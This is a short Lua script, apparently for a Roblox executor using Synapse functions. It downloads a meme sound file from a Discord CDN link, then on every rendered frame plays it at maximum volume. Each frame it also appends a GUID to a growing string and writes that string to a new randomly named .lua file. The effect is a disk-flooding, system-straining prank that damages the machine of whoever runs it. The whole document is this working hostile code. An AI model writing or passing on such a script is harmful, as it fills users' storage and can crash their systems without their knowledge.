writefile('test.ogg', syn.request({Url='https://cdn.discordapp.com/attachments/1092144627856965712/1092147057000714270/onlymp3.to_-_Metal_pipe_falling_sound_effect_but_its_more_violent-f8mL0_4GeV0-256k-1654643797084.mp3', Method='GET'}).Body)

local a = ""

Drawing.OnPostRenderStepped:Connect(function(dt)
local sound = Instance.new("Sound", workspace)
sound.PlayOnRemove = true
sound.Volume = 10
sound.SoundId = getsynasset("test.ogg")
sound:Destroy()

a = a..game:GetService("HttpService"):GenerateGUID(false)

writefile(math.random(1,9e9)..".lua", a)
end)
